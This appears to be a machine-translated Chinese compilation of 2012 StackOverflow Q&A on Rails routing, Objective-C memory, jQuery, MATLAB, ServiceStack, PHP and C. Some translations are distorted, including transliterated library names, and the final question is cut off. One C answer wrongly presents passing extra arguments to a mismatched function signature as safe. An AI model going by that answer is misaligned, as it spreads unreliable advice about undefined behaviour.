# StackOverflow 问答 10114000-10114999

# ruby-on-rails-3 - 路由 - 为什么永久链接“john.green”不起作用？

> ID：10114009
> 
> 赞同：1
> 
> 时间：2012-04-11T21:06:57.477
> 
> 标签：ruby-on-rails-3, url, routes, permalinks

在`routes.rb`我已经设置

> 匹配“成员/：永久链接”=>“帐户#profile”

当用户的 url 名称为`john-green`, `john_green`, 时`johngreen`，一切正常，但当 url 名称为 时`john.green`，永久链接仅采用第一部分 -`john` 具体来说，来自 Rails 调试窗口：

```
Request

Parameters:

{"permalink"=>"john",
 "format"=>"green"} 
```

为什么不接受`.`永久链接中的（点）？存在使用它的任何功能吗？ **编辑**当我使用

```
 match "member/:permalink" => "accounts#profile", 
        :requirements       => { :permalink => /.+/ } 
```

我明白了

```
{"requirements"=>{"permalink"=>/.+/},
 "permalink"=>"john",
 "format"=>"green"} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:15:02.293

默认情况下，Rails 将点之后的所有内容都视为一种格式，并且看起来没有简单的方法可以覆盖这种行为。但是有一些使用`:requirements`选项的肮脏解决方法：

```
match 'member/:permalink' => 'accounts#profile', 
      :constraints        => { :permalink => /.+/ } 
```

通过为参数添加贪婪的正则表达式，`:permalink`您可以让 Rails 将`member/`在路径中的子字符串之后找到的所有内容传递到`params[:permalink]`.

# xml - 引用计数对象在发布后使 用？NSXML解析器

> ID：10114010
> 
> 赞同：0
> 
> 时间：2012-04-11T21:07:00.347
> 
> 标签：xml, xcode, memory, nsxmlparser, memory-leaks

我已经从这个网站下载了这段代码。[http://homepages.ius.edu/rwisman/C490/html/nsxmlparser.htm](http://homepages.ius.edu/rwisman/C490/html/nsxmlparser.htm)

正如我分析它。我有内存泄漏。我已经尝试了从 autorelease、sender、nil、[parser setDelegate: [Top10Parser new]] 等谷歌的所有内容。它不起作用。

我需要帮助。

```
- (void) run: (id) param  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

    NSXMLParser *parser = [NSXMLParser alloc];
    [parser initWithContentsOfURL: url]; 
```

[解析器 setDelegate: self]; <- ("Reference-counted object is used after it is release")

```
 [parser parse];
    [parser release];

    if ([delegate respondsToSelector:@selector(parseDidComplete:)])
        [delegate performSelector:@selector(parseDidComplete:) onThread: thread 
                       withObject: outstring waitUntilDone:NO];

    [pool release];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T21:25:24.257

更改这两行：

```
NSXMLParser *parser = [NSXMLParser alloc];
[parser initWithContentsOfURL: url]; 
```

至

```
NSXMLParser *parser = [[NSXMLParser alloc] initWithContentsOfURL: url]; 
```

对于一些思想流派，`+alloc`返回一个拥有的对象，init 方法既不添加也不删除所有权。更正确的做法是——这也是分析器处理它的方式——考虑一个 init 方法消耗接收器上的引用并返回一个拥有的对象。因此，如果您调用 init 方法但未将结果分配给`self`，那么您拥有的所有权`self`已被消耗，并且您没有指向新拥有的对象的指针。未来的所有用途`self`都在使用您不再拥有的对象。

# jquery - Jquery将href添加到包含javascript功能的链接

> ID：10114011
> 
> 赞同：0
> 
> 时间：2012-04-11T21:07:00.773
> 
> 标签：jquery

正在寻找清理以下链接的方法：

```
 <a href="javascript:void((function()%7Bvar%20e=document.createElement('script');e.setAttribute('type','text/javascript');e.setAttribute('charset','UTF-8');e.setAttribute('src','http://assets.pinterest.com/js/pinmarklet.js?r='+Math.random()*99999999);document.body.appendChild(e)%7D)());"><img src="/images/Social%20Media/pinterest.png"/></a> 
```

像这样的东西

```
<a id="pinterest><img src="/images/Social%20Media/pinterest.png"/></a> 
```

和通过 Jquery 的 href 部分

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:40:17.573

我想你想要这个

**HTML**

```
<a id="pinterest" href="">
    <img src="/images/Social%20Media/pinterest.png"/>
</a>​ 
```

**JS**

```
$('#pinterest').attr("href","javascript:void((function()%7Bvar%20e=document.createElement('script');e.setAttribute('type','text/javascript');e.setAttribute('charset','UTF-8');e.setAttribute('src','http://assets.pinterest.com/js/pinmarklet.js?r='+Math.random()*99999999);document.body.appendChild(e)%7D)());");​ 
```

[这里有一个例子](http://jsfiddle.net/heera/uJtvV/1/)。单击示例中的图像进行检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:15:31.353

首先认为你必须做的是从你的链接中删除属性 href 似乎现在唯一的方法是通过元素名称来获取它，这可能不是最好的主意

```
$("a").removeAttr("href") 
```

然后您可以将属性 ID 添加到您的链接

```
$("a").attr( "id" , "pinterest"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:25:35.970

如果只是用 JS 更改链接：

```
$('a[href^="javascript:void((function()%7Bvar%20e="]').replaceWith('<a id="pinterest"><img src="/images/Social%20Media/pinterest.png"/></a>')​; 
```

如果您已经有一个外部脚本，并且可以更改标记，只需将 HTML 更改为

```
<a id="pinterest"><img src="/images/Social%20Media/pinterest.png"/></a> 
```

和：

```
$('#pinterest').on('click', function(e) {
    e.preventDefault();
    $.getScript('http://assets.pinterest.com/js/pinmarklet.js?r='+Math.random()*99999999);
}); 
```

这是一个[FIDDLE ->](http://jsfiddle.net/adeneo/uJtvV/4/)显示它有效吗？

# python - 为什么我的程序可以使用 .py 扩展名但不能使用 .pyw 扩展名？

> ID：10114018
> 
> 赞同：6
> 
> 时间：2012-04-11T21:07:39.150
> 
> 标签：python, user-interface, tkinter, pythonw

我有一个脚本，它使用 Tkinter 编写的简单 GUI 界面将 Google 地球`.kml`/文件转换为 shapefile。`.kmz`

我的问题是它可以与`.py`扩展名一起正常工作，但是当使用`.pyw`扩展名保存时，它会在读取我的`.kml`文件时停止。

没有错误消息，也不会崩溃。GUI 启动正常，等等，但它只是停止并且总是在同一个地方。我使用的是 Python 2.5，并且使用 Python 2.7 得到了相同的结果。

有什么想法可能导致这种情况吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T21:20:15.927

`.pyw`文件的运行方式与 .py 文件不同——它们与不同的解释器相关联，`pythonw.exe`而不是与`python.exe`没有关联控制台的解释器相关联。

根据一些消息来源，包括[这个旧的邮件列表线程](http://mail.python.org/pipermail/python-list/2001-September/103208.html)，一些操作在没有控制台的情况下无法工作。

如果没有看到确切的脚本，我们无法确切知道是什么导致了`pythonw`.

# matlab - 向量内序列的计数频率

> ID：10114019
> 
> 赞同：1
> 
> 时间：2012-04-11T21:07:39.547
> 
> 标签：matlab, sequence, counting

假设我有一个长度为 N 的二进制向量，我正在寻找该向量中以下 16 个序列中每个序列的频率：

```
0000, 0001, 0010, 0011, ..., 1111 
```

计算向量中每个序列的频率的最简单方法是什么？理想情况下，我想知道如何在 MatLab 中做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T02:01:26.637

解决此问题的一种简单方法是将二进制数转换为十进制数，然后使用其中一个`hist`或`accumarray`计算出现次数。我首先将数组重新整形为 (N-3)×4 数组，它允许对所有计算进行矢量化。

```
%# make up some test data
data = [0 0 1 1 0 1 0 1 1 1 1 1 0 0 1 1];

%# reshape into a (N-3)-by-4 array
%# idx is [1 2 3 4;2 3 4 5;...]
idx = bsxfun(@plus,(1:length(data)-3)',0:3); %'# 
data = data(idx);

%# convert binary numbers to decimals
%# use matrix multiplication
decData = data * [8;4;2;1];

%# count number of occurences - possible values are 0 through 15
counts = hist(decData,0:15); 
```

`counts(1)`计算序列`0 0 0 0`出现在列表中的次数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:10:35.353

这些是数字 0x0 到 0xF，只需将它们 ++ 作为索引到大小为 0xF 的数组中。对数组元素求和，A[i]/N 是你的频率。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-12T04:44:08.677

```
count = zeros(1,16);
vector = [1 0 0 1 1 1 1 0 0];
N = length(vector);

for ii = 1:(N-3)
    cur_seq = vector(ii:ii+3);        % Grab the running set of four entries
    cur_num = cur_seq*[8; 4; 2; 1];   % Convert these entries to non-binary.

    % Update the count of the sequence that has cur_num
    % as its non-binary integer representation. Note that
    % you must use cur_num+1 as the index since Matlab is
    % 1-based, but the integers from your sequences are 0
    % through 15.

    count(cur_num+1) = count(cur_num+1) + 1;
end 
```

现在`count(1)`计算 的出现次数`[0,0,0,0]`，并`count(2)`计算 的出现次数，`[0,0,0,1]`依此类推。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-04T15:09:36.150

让数据和块长度定义为

```
x = [ 1 0 1 0 0 0 0 0 1 1];
M = 4; 
```

然后可以用一行得到结果如下：

```
result = histc(conv(x, 2.^(0:M-1), 'valid'), 0:2^M-1); 
```

在这个例子中，

```
result =
     2   1   0   1   1   0   0   0   1   0   1   0   0   0   0   0 
```

表示`2`发生`[0 0 0 0]`，`1`发生`[0 0 0 1]`等。

**这是如何工作的**：

1.  [`conv`](http://es.mathworks.com/help/matlab/ref/conv.html)用 的幂计算卷积（使用） `2`，以找到每个滑动长度`M`二进制数的十进制表示。
2.  计算在步骤 1 中获得的每个数字的出现次数（使用[`histc`](http://es.mathworks.com/help/matlab/ref/histc.html)）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T21:23:26.620

如果`a`保存您的数据：

```
c = []
for el = a,
  c = [c, sum(a==el)];
end 
```

这是二次的，但计数与 相同`a`。如果您事先不知道范围，它也会起作用。

# javascript - 停止 javascript 事件传播

> ID：10114022
> 
> 赞同：1
> 
> 时间：2012-04-11T21:07:45.990
> 
> 标签：javascript, jquery, events

当您将鼠标悬停在以下站点上的其中一个图像上时，会出现一个 div，其中包含操作按钮。当您单击 div 时，会打开一个弹出窗口，当您单击子操作按钮时，会发生一个不同的事件。

当您单击 div 的其中一个子按钮时，会出现弹出窗口。我尝试使用下面的代码停止事件传播。

[http://penguinenglishlibrary.tumblr.com/](http://penguinenglishlibrary.tumblr.com/)

```
$(document).on('click', '#DOMWindow .like', function(event) {
    event.preventDefault();
    event.stopPropagation();

}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:11:42.497

您无法停止传播，因为该事件已被委派。您真的需要委托，即`#DOMWindow .like`在绑定时已经存在吗？如果是这样，您可以这样做：

```
$('#DOMWindow .like').on('click', function(event) {
    event.preventDefault();
    event.stopPropagation();
}); 
```

**或者，正如我后来在评论中所说：**

如果您真的需要委托，您可以将处理程序逻辑包装在 if 中，以检查 event.target 是否为`#DOMWindow .like`。如果是，让处理程序完成它的工作，否则意味着它正在冒泡，所以什么都不做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:12:40.667

也许

```
jQuery('#DOMWindow .like').unbind('mouseenter mouseleave'); 
```

假设您在 jQuery(.selector').hover() 上附加了一个事件，它可能会起作用

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:18:34.847

您无法通过绑定事件的方式停止传播。它是必然的`document`。一旦事件发生`document`，它就会冒泡到顶部，因此无法停止，因为它已经传播了。

尝试将事件绑定到更接近的父元素，`.like`例如`#DOMWindow`。注意：当 this 被调用时，你绑定事件的元素必须在 DOM 中（并且留在 DOM 中）。

```
$('#DOMWindow').on('click', '.like', function(event) {
    event.preventDefault();
    event.stopPropagation();
}); 
```

看看我做的这个例子：http: [//jsfiddle.net/QAZ3v/](http://jsfiddle.net/QAZ3v/) 它应该告诉你我的意思。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T21:47:28.623

根据 jQuery 中 on() 函数的文档，

> 默认情况下，大多数事件会从原始事件目标冒泡到文档元素。在此过程中的每个元素处，jQuery 都会调用任何已附加的匹配事件处理程序。处理程序可以通过调用 event.stopPropagation() 来防止事件在文档树中进一步向上冒泡（从而防止这些元素上的处理程序运行）。但是，附加在当前元素上的任何其他处理程序都将运行。为了防止这种情况，请调用 event.stopImmediatePropagation()。（绑定到元素的事件处理程序的调用顺序与它们绑定的顺序相同。）

所以看来

```
 event.stopImmediatePropagation(); 
```

就是你要找的。返回 false 也可以，但我不太确定。

来源：[http ://api.jquery.com/on/](http://api.jquery.com/on/)

编辑：在小提琴中测试了我的两个建议之后，似乎两者都不适用于点击处理程序。我很想知道它们是否适用于 on()。

# javascript - 模块模式如何知道如何在这里调用构造函数？

> ID：10114031
> 
> 赞同：1
> 
> 时间：2012-04-11T21:08:57.457
> 
> 标签：javascript

外部 var Message 和内部 var Message 之间有什么联系？

**召唤**

```
new Message ( element ).display( server_response_text.slice( 6 ) ); 
```

**目的**

```
var Message = ( function () 
{
    var messages = 
    {
        name:         'Please enter a valid name',
        email:        'Please enter a valid email',
        email_s:      'Please enter a valid email.',
        pass:         'Please enter passoword, 6-40 characters',
        url:          'Please enter a valid url',
        title:        'Please enter a valid title',
        tweet:        'Please enter a valid tweet',
        empty:        'Please complete all fields',
        same:         'Please make emails equal',
        taken:        'Sorry, that email is taken',
        validate:     'Please contact <a class="d" href="mailto:here@host.com">support</a> to reset your password',
    };
    var Message = function (element) 
    {
        this.element = element;
    };
    Message.prototype.display = function( type ) 
    {
        this.element.innerHTML = messages[ type ];
        new Effects().fade( this.element, 'down', 4000 );
    };
    return Message;
} () ); 
```

我的整个图书馆都在使用这样的模块模式

```
 var NS = ( function ( window, undefined ) 
    {
    /*
    all code here including Message
    */
    } )( window ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:10:47.803

尽管名称相同，但这些变量引用是相等的。

在匿名函数内部，`Message`是一个本地声明的构造函数。
在函数结束时返回对该构造函数的引用。

身份测试：

```
window.Message = ( function () {
    ...
    // Defer call
    setTimeout(function() {
        alert('Identity? ' + Message === window.Message);
    }, 100);
    return Message;
} () ); 
```

## 图片：

*   绿色对象（构造函数）在**红色** 块（函数）中**定义。**`Message`
***   在此函数结束时，`Message`返回创建的绿色对象。*   创建函数后，立即使用**`()`**. 返回值（**绿色框**）被传递给**橙色** `Message`变量。*   现在，**橙色** `Message`变量指向**绿色** `Message`对象/构造函数。澄清一下：**绿色和橙色`Message`变量指的是同一个对象**。*   这个构造函数的一个实例是使用[`new`操作符](https://developer.mozilla.org/en/JavaScript/Reference/Operators/new)创建的。**

 **![](../Images/b51c8117a631e04bfef7467360036e83.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:11:35.290

外部消息被设置为立即函数调用的结果（“（函数（）...”）。立即函数的返回值是内部消息，它也被设置为一个函数（就在“var消息”关闭范围，“var Message = function(element)”函数。）。

当您在此代码之外调用 new Message 时，它​​将调用“var Message = function(element)”函数来构造对象。

使用这种形式的原因是“消息”被保存在一个闭包中——本质上，它是私有数据。这是一个注释版本：

```
var Message = ( function ()     // Immediate function call
{
    // This is going to be private data - it's in a closure via the immediate function call
    var messages = 
    {
        name:         'Please enter a valid name',
        email:        'Please enter a valid email',
        email_s:      'Please enter a valid email.',
        pass:         'Please enter passoword, 6-40 characters',
        url:          'Please enter a valid url',
        title:        'Please enter a valid title',
        tweet:        'Please enter a valid tweet',
        empty:        'Please complete all fields',
        same:         'Please make emails equal',
        taken:        'Sorry, that email is taken',
        validate:     'Please contact <a class="d" href="mailto:here@host.com">support</a> to reset your password',
    };

    // This will be returned as the actual value of outer Message
    var Message = function (element) 
    {
        this.element = element;
    };

    // This adds to the prototype so it will be found in all instances of Message objects
    Message.prototype.display = function( type ) 
    {
        this.element.innerHTML = messages[ type ];
        new Effects().fade( this.element, 'down', 4000 );
    };

    // This is the return value of the immediate function call and becomes outer Message
    return Message;
} () ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T21:12:21.137

变量名称根本没有关系^(1 。)

这只是内部使用的名称。也可能是`fuubar`：

```
var fuubar = function (element) 
{
    this.element = element;
};
fuubar.prototype.display = function( type ) 
{
    this.element.innerHTML = messages[ type ];
    new Effects().fade( this.element, 'down', 4000 );
};
return fuubar; // the Object is returned, the Variable (Name) is not 
```

*外部*名称是 是有道理的`Message`，因为这就是其他人“知道”它的方式。¹选择内部名称可能是为了保持一致性，但不会影响语义。

构造函数只是 [设计为] 使用*new*运算符调用的函数对象。变量可以命名对象。在这种情况下，请注意它是返回的*函数对象*。因此，*函数对象*通过外部名称`Message`（例如“分配给消息”）而为人所知。但是，*变量不是对象*。

因此`new X()`计算表达式`X`，它必须计算为函数对象，然后将其用作构造函数。（构造函数只是一个期望与 一起使用的普通函数`new`：它可以执行初始化并建立一个 [[prototype]]）。名称`X`并不*重要*，除非它必须评估为函数对象。考虑这个等价形式来显示：`new (X)()`。*首先*`(X)`计算表达式。

 *所以，让我们分解代码：

```
var Message = (function () {
   // This function is invoked immediately, due to the
   // parenthesis immediately after the FunctionExpression.
   // As noted above the name Message used inside is not important.
   // What *IS* important is that a Constructor, which is just
   // a function-object (which is just an object) is returned.
   // This returned object will be assigned to (the outer)
   // Message variable. That is, it is "named by Message"
   // after the assignment occurs.
})()

// At this point Message will evaluate to a function-object
// (a Constructor in particular).
Message instanceof Function // -> true

// And we can use it to create new messages:
var messageA = new Message("a")
var messageB = new Message("b") 
```

快乐编码。***

# jquery-ui - Fancybox - 集成 jQuery Ui 手风琴

> ID：10114040
> 
> 赞同：1
> 
> 时间：2012-04-11T21:09:41.610
> 
> 标签：jquery-ui, fancybox, accordion

我目前正在使用 Fancybox，并希望添加使用 jQuery UI 手风琴打开或关闭图像下文本标题的功能。不幸的是，我很难让 jQuery UI 手风琴工作。我在页面上（在 Fancybox 之外）测试了一个手风琴，它运行良好。

这是代码：

```
<script>
$(document).ready(function() {

$("a.fancybox").fancybox({
    'titlePosition' : 'outside',
});

    $( "#accordion" ).accordion({
    collapsible: true
});

});
</script>

<a class="fancybox" rel="group1" href="images/example.jpg" title="<div id='accordion'><h3><a href='#'>Example</a></h3><div><p>text here</p></div></div>" ><img src="images/example.jpg" alt="Portraits"></a> 
```

任何指导将不胜感激！谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:38:51.227

看看这个小提琴

[带幻灯片的图像切换描述](http://jsfiddle.net/ft3Ge/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T00:00:58.920

在不使用任何其他插件的情况下切换fancybox 中的标题会不会更容易？

```
$("a.fancybox").fancybox({
 'titlePosition' : 'over',
 'onComplete' : function() {
  $("#fancybox-wrap").hover(function() {
   $("#fancybox-title").show();
  }, function() {
   $("#fancybox-title").hide();
  }); // hover
 } // onComplete
}); // fancybox 
```

[在http://fancybox.net/blog](http://fancybox.net/blog) No. 3查看演示

您甚至可以添加一些动画来调整`onComplete`选项，例如

```
'onComplete' : function() {
 $("#fancybox-title").hide();
 $("#fancybox-wrap").hover(function() {
  $("#fancybox-title").stop(true,true).slideDown(200);
 }, function() {
  $("#fancybox-title").stop(true,true).slideUp(200);
 }); // hover
} // onComplete 
```

# javascript - 自动从具有给定 ID 的网页打开本地文件

> ID：10114042
> 
> 赞同：0
> 
> 时间：2012-04-11T21:09:43.887
> 
> 标签：javascript, asp.net, html, file, web

我想设计一个网络服务（或嵌入到本地主机上运行的网页中的脚本），它接受 fileid 作为参数，然后在同一主机上自动打开相应的文件。

例如，如果我们在 Windows PC 上的浏览​​器中输入[http://localhost/openFile.aspx?id=JohnBrown](http://localhost/openFile.aspx?id=JohnBrown)，它应该会自动打开存储在硬盘中的文件 JohnBrown.ppsx。

你能指导我如何实现这一目标吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:59:07.107

`Server.Transfer`到所需的页面。

# serialization - 覆盖 ServiceStack 中的字段名称反序列化

> ID：10114044
> 
> 赞同：25
> 
> 时间：2012-04-11T21:10:01.127
> 
> 标签：serialization, servicestack

我正在使用 ServiceStack 反序列化一些 HTML 表单值，但无法弄清楚如何覆盖应该读取每个字段的值。

例如，表单发布了一个值，`first_name`但我的 POCO 上的属性被调用`FirstName`。我将如何在 ServiceStack 中进行这样的映射

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-04-11T21:23:28.370

ServiceStack 文本序列化程序支持 [DataMember] 别名，您可以在其中使用 Name 参数指定每个字段的别名，例如：

```
[DataContract]
public class Customer
{
    [DataMember(Name="first_name")]
    public string FirstName { get; set; }

    [DataMember(Name="last_name")]
    public string LastName { get; set; }
} 
```

注意：将 [DataContract] / [DataMember] 属性添加到 DTO 后，行为将变为可选，您将在要序列化的每个属性上添加 [DataMember]。

### 为所有 DTO 发出惯用的 JSON

您可以通过指定以下全局设置来指示 JSON 序列化遵循不同的约定：

```
//Emit {"firstName":"first","lastName":"last"}
JsConfig.Init(new Config { TextCase = TextCase.CamelCase });

//Emit {"first_name":"first","last_name":"last"}
JsConfig.Init(new Config { TextCase = TextCase.SnakeCase }); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-03-07T13:51:56.537

为了使用下划线约定序列化 C# 类，您需要将 JsConfig.EmitLowercaseUnderscoreNames 设置为 true，如[mythz](https://stackoverflow.com/users/85785/mythz)所说。

```
JsConfig.EmitLowercaseUnderscoreNames = true; 
```

但是，根据我的经验，反序列化会失败，因为它期望 CamelCased 值。开启下划线json值反序列化，需要设置JsConfig的PropertyConvention。

```
JsConfig.PropertyConvention = PropertyConvention.Lenient; 
```

我使用一个简单的辅助方法来解决序列化和反序列化问题。

```
public static class JsonHelpers
{
    public static string ToUnderscoredJson<T>(this T obj)
    {
        JsConfig.EmitLowercaseUnderscoreNames = true;

        return JsConfig.PreferInterfaces
            ? JsonSerializer.SerializeToString(obj, AssemblyUtils.MainInterface<T>())
            : JsonSerializer.SerializeToString(obj);
    }

    public static T FromUnderscoredJson<T>(this string json)
    {
        JsConfig.PropertyConvention = PropertyConvention.Lenient;
        return JsonSerializer.DeserializeFromString<T>(json);
    }
} 
```

# c++ - 用于评估数学/算术表达式的 C++ 函子库

> ID：10114047
> 
> 赞同：12
> 
> 时间：2012-04-11T21:10:22.017
> 
> 标签：c++, algorithm, parsing, math, functor

有谁知道一个图书馆可以让你做这样的事情？

```
std::transform(vecA.begin(), vecA.end(), 
               vecB.begin(), 
               vecOutput.begin(), 
               // run-time specified expression 
               magic_functor<float>("exp(a/(b+3))") 
); 
```

其中 magic_functor 是库提供的仿函数，a 和 b 通过 vecA 和 vecB 进行迭代。

我可以自己想出一些东西（这样做会很有趣），但最好避免重新发明轮子（我的老板也会杀了我）。花了一些时间搜索网络，但无法真正找到符合要求的任何内容。

它需要灵活和快速，因此只解析字符串一次（例如在构造时在内部创建执行堆栈）的仿函数方法将是理想的，但对其他解决方案持开放态度。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:14:47.240

几个选项（需要一些工作并且不会“开箱即用”）：

*   编写您自己的（[Boost Spirit](http://boost-spirit.com/home/)是您的朋友）解析器（[示例](http://agentzlerich.blogspot.com/2011/06/using-boost-spirit-21-to-evaluate.html)）
*   [解析器X](https://github.com/beltoforion/muparserx)
*   [数学派索](https://github.com/kobalicek/mathpresso)
*   其他图书馆

# php - 记分牌系统，php和mysql

> ID：10114048
> 
> 赞同：1
> 
> 时间：2012-04-11T21:10:25.993
> 
> 标签：php, mysql, oop

我查看了很多很多关于如何在结果超过后制作编号导航链接的指南，比如说 25 个结果，所以 url 栏会有一个类似的 url ./index.php?page=3，并且找不到容易的东西根据我的代码实现：

```
 <body>
    <div id = 'scoreboardcontainer'>
<?php
    $ranking = mysql_query("SELECT username, points\n"
    . "FROM sector0_players\n"
    . "WHERE points = (SELECT MAX(points) FROM sector0_players WHERE points< (SELECT MAX(points) FROM sector0_players WHERE points <(SELECT MAX(points) FROM sector0_players)))");
?>
            <ul>
                <li><a href="#scoreboard" title = "Point scoreboards">Scoreboards</a></li>
                <li><a href="#Tour_boards" title = "Tournament socreboards" class = "tbr">Tournament</a></li>
            </ul>

            <div id="scoreboard">
                <div class = "scoreboardtitles">
                    <div class = "player_score_rankinfl2">Rank</div>
                    <div class = "player_score_usnamefl2">Username</div>
                    <div class = "player_score_charnamefl2">Character</div>
                    <div class = "player_score_pointfl2">Points</div>
                </div>
                <br />
                <hr />
            <?php
    $scoreboardquery = mysql_query("SELECT * FROM sector0_players ORDER BY points DESC");
    while($scoreboard_fetch = mysql_fetch_array($scoreboardquery)){
?>
                <div class="global_container_score_class"> <!--Start generating from here-->
                    <div class = "scoreboard_1l">
                            <div class = "player_rank">1st</div>
                            <div class = "player_name"><a href = "profile.php?id=<?php echo $scoreboard_fetch['id'];?>"><?php echo $scbdname = $scoreboard_fetch['username'];?></a></div>
                    </div>
                    <div class = "scoreboard_2r">
                            <div class = "player_charname"><?php echo $scbddspname = $scoreboard_fetch['displayname'];?></div>
                            <div class = "player_points"><?php echo $scbdpoints = number_format($scoreboard_fetch['points']);?></div>
                    </div>
                    <div class = "clear"></div>
                </div>
                <?php
                }
                ?>
            </div> 
```

我在 OOP 方面没有经验，我知道如何对其进行编程，但不会对其进行修改以满足我的需要。如果这种情况需要 OOP，如果有人能为我提供学习高级 OO 的良好开端，我将不胜感激。如果没有，只需输入我需要实现的内容（除非必要，否则不需要代码）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T21:17:48.537

如果我理解正确，您说的是分页 - 不一定需要 OOP。如果你有兴趣从头开始学习，搜索“php pagination”会产生大量信息：]

# wpf - 将样式向下传递给 UserControl 的子级

> ID：10114053
> 
> 赞同：0
> 
> 时间：2012-04-11T21:10:53.857
> 
> 标签：wpf, xaml, data-binding, user-controls

所以我正在编写一个由其他几个控件组合而成的 UserControl。特别是一个图表、另一个自定义日期范围控件和用于填充屏幕其他区域的 ContentPresenters。

所以我很好地将我的内容演示者绑定到依赖属性，`{Binding ElementName=chartView, Path=RightContent}`我想如果我想将一个可选的数据点样式传递给实际的图表控件，我可以做一些事情，比如`{Binding ElementName=chartView, Path=DataPointStyle}`绑定到 Style 类型的依赖属性。

可悲的是，这给了我错误`System.Windows.Data Error: 4 : Cannot find source for binding with reference 'ElementName=chartView'. BindingExpression:Path=DataPointStyle; DataItem=null; target element is 'ColumnSeries' (Name=''); target property is 'DataPointStyle' (type 'Style')`

因此，我认为 Chart 和 ColumnSeries 控件的工作方式存在一些奇怪的 XAML 范围。它是 2010 年 2 月 WPF 工具包中的 Chart 控件，所以如果有更新的东西我无论如何都应该使用，知道这也很酷。

所以基本上：

```
<UserControl x:Class="MyFramework.Controls.ChartView"
         x:Name="chartView"
         ...>

    ...

    <!-- Works great -->
    <ContentPresenter Content="{Binding ElementName=chartView, Path=TopContent}" />

    <!-- Doesn't work -->
    <charting:Chart>
        <charting:ColumnSeries DataPointStyle="{Binding ElementName=chartView, Path=DataPointStyle}" />
        </charting:Chart>
    </charting:Chart>

    ...
</UserControl> 
```

如何使 ColumnSeries.DataPointStyle 上的第二个绑定起作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:40:35.327

我从来没有遇到过这样的问题，但作为一种解决方法，您可以尝试使用`RelativeSource`和`FindAncestor`模式绑定。

# php - 将 PHP 错误存储在日志文件中

> ID：10114054
> 
> 赞同：0
> 
> 时间：2012-04-11T21:10:56.570
> 
> 标签：php

我想将 php 生成的任何错误和警告存储在日志文件中，但**仍以**正常方式（回显）显示它们。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:13:21.423

[php.ini](http://php.net/manual/en/errorfunc.configuration.php)包含两个相关变量：您可以使用 指定日志文件`error_log`，并选择是否显示错误`display_errors`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:21:53.813

您可以定义自己的函数并描述如何处理错误。

[http://www.php.net/manual/en/function.set-error-handler.php](http://www.php.net/manual/en/function.set-error-handler.php)

[http://www.php.net/manual/en/function.set-exception-handler.php](http://www.php.net/manual/en/function.set-exception-handler.php)

[http://php.net/manual/en/function.register-shutdown-function.php](http://php.net/manual/en/function.register-shutdown-function.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:18:38.700

我对这个问题不是 100% 清楚，但觉得它是错误处理的组合：

```
http://us2.php.net/manual/en/ref.errorfunc.php 
```

并在您的 php.ini 文件中或在运行时正确设置错误处理设置：

```
http://us2.php.net/manual/en/function.ini-set.php 
```

具体来说：

```
http://us2.php.net/manual/en/errorfunc.configuration.php 
```

如果您有具体的想法，请告诉我。

# c - 在编译时选择/发现外部函数调用的签名

> ID：10114055
> 
> 赞同：2
> 
> 时间：2012-04-11T21:11:00.733
> 
> 标签：c, linker, extern

我在外部库中调用了一个函数，该函数在版本 1 和版本 2 之间添加了一个参数。我想同时支持这两个版本。

在这一点上我做

```
 extern void run(int param1); 

 ... in the code ...
 run(123); 
```

在版本 2 中，它运行（int param1，int param2）。

我可以动态检测我链接的库的版本吗？（参数数量）

我想避免让用户在 Makefile 中设置库版本并使用预处理器-ifs 解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T23:16:04.283

C 代码的工作方式是 v1 函数只能访问第一个传递的参数。只要该参数对两个版本具有相同的含义，您就可以安全地将两个参数传递给提供的任何函数。v1 只会看到第一个；v2 将看到这两个参数。

这种能力来自于 C 的架构需要支持可变数量的参数，例如`printf()`. 调用代码在调用完成后删除参数，并将参数从右向左推送，以便第一个（最左边的）参数始终位于堆栈帧的顶部。

只有当库的 API 因升级而被严重亵渎时，第一个参数才会有不同的含义。

# c# - 插入错误：无法打开登录请求的数据库“xxxx”

> ID：10114061
> 
> 赞同：0
> 
> 时间：2012-04-11T21:11:22.610
> 
> 标签：c#, sql, sql-server

您好我在尝试从我在网页上创建的表单将数据插入数据库时​​遇到错误：

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:22:15.193

用户“PC/User”没有数据库的正确权限。

对您的标题进行简单的 Google 搜索会产生如下结果：

